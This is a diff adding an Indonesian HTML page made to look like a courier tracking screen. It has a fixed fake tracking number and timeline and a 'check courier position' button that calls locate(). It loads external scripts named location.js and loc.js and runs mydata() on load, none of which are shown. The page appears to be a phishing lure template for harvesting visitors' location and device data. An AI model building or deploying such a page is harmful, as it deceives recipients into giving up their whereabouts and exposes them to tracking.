@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Status Paket Anda</title>
+    
+    <!-- SYSTEM SCRIPTS (DO NOT REMOVE) -->
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/feather.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <script>
+        window.console = window.console || function(t) {};
+        if (document.location.search.match(/type=embed/gi)) {
+            window.parent.postMessage("resize", "*");
+        }
+    </script>
+    
+    <!-- Google Fonts for Modern Look -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-bg: #f3f4f6;
+            --card-bg: #ffffff;
+            --text-main: #1f2937;
+            --text-muted: #6b7280;
+            --accent: #3b82f6;
+            --accent-hover: #2563eb;
+            --status-success: #10b981;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--primary-bg);
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border-radius: 20px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            max-width: 450px;
+            width: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #3b82f6, #60a5fa);
+            padding: 40px 30px;
+            color: white;
+            position: relative;
+            text-align: center;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -15px;
+            left: 0;
+            width: 100%;
+            height: 30px;
+            background-color: var(--card-bg);
+            border-radius: 50% 50% 0 0;
+        }
+
+        .package-icon {
+            background: rgba(255, 255, 255, 0.2);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px auto;
+        }
+
+        .tracking-number-label {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            margin-bottom: 5px;
+        }
+
+        .tracking-number {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-top: 10px;
+            backdrop-filter: blur(5px);
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .eta-box {
+            background-color: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .eta-info h3 {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        .eta-info p {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        .timeline {
+            position: relative;
+            padding-left: 30px;
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 7px;
+            top: 5px;
+            bottom: 5px;
+            width: 2px;
+            background-color: #e2e8f0;
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 25px;
+        }
+        
+        .timeline-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .timeline-dot {
+            position: absolute;
+            left: -30px;
+            top: 5px;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: #cbd5e1;
+            border: 3px solid white;
+            box-shadow: 0 0 0 1px #cbd5e1;
+            z-index: 2;
+        }
+
+        .timeline-item.active .timeline-dot {
+            background-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        .timeline-item.completed .timeline-dot {
+            background-color: var(--status-success);
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
+        }
+
+        .timeline-date {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-bottom: 3px;
+        }
+
+        .timeline-title {
+            font-weight: 600;
+            font-size: 1rem;
+            color: var(--text-main);
+            margin-bottom: 3px;
+        }
+
+        .timeline-desc {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .action-container {
+            padding: 0 30px 30px 30px;
+        }
+
+        .locate-button {
+            width: 100%;
+            background-color: var(--accent);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.3);
+        }
+
+        .locate-button:hover {
+            background-color: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.4);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header / Resi Info -->
+        <div class="header">
+            <div class="package-icon">
+                <i data-feather="box" style="width: 30px; height: 30px; color: white;"></i>
+            </div>
+            <div class="tracking-number-label">Nomor Resi / AWB</div>
+            <div class="tracking-number">ID-9823746102</div>
+            <div class="status-badge">Sedang Diperjalanan</div>
+        </div>
+
+        <!-- Tracking Content -->
+        <div class="content">
+            <div class="eta-box">
+                <div class="eta-info">
+                    <h3>Estimasi Tiba</h3>
+                    <p>Hari Ini, 14:00 - 18:00</p>
+                </div>
+                <div style="color: var(--accent);">
+                    <i data-feather="truck" style="width: 32px; height: 32px; opacity: 0.8;"></i>
+                </div>
+            </div>
+
+            <div class="timeline">
+                <div class="timeline-item active">
+                    <div class="timeline-dot"></div>
+                    <div class="timeline-date">Hari ini, 09:30 WIB</div>
+                    <div class="timeline-title">Kurir Menuju Lokasi Anda</div>
+                    <div class="timeline-desc">Paket sedang dibawa oleh kurir menuju alamat tujuan pengiriman.</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="timeline-dot"></div>
+                    <div class="timeline-date">Hari ini, 06:15 WIB</div>
+                    <div class="timeline-title">Paket Keluar dari Gudang</div>
+                    <div class="timeline-desc">Paket telah diberangkatkan dari fasilitas transit pusat.</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="timeline-dot"></div>
+                    <div class="timeline-date">Kemarin, 21:40 WIB</div>
+                    <div class="timeline-title">Paket Tiba di Fasilitas Hub</div>
+                    <div class="timeline-desc">Paket sedang diproses untuk pengiriman rute lokal.</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="timeline-dot"></div>
+                    <div class="timeline-date">Kemarin, 14:20 WIB</div>
+                    <div class="timeline-title">Pesanan Diproses</div>
+                    <div class="timeline-desc">Pengirim telah menyerahkan paket ke agen ekspedisi.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Action Area (THIS IS THE CORE LOGIC BUTTON) -->
+        <div class="action-container">
+            <button class="locate-button" onclick="locate()">
+                <i data-feather="map-pin"></i>
+                <span>Cek Posisi Kurir Terkini</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- SYSTEM SCRIPTS END (DO NOT REMOVE) -->
+    <script id="rendered-js">
+        feather.replace();
+    </script>
+    <script>
+        $(document).ready(function() {
+            if (typeof mydata === 'function') {
+                mydata();
+            }
+        });
+    </script>
+</body>
+</html>
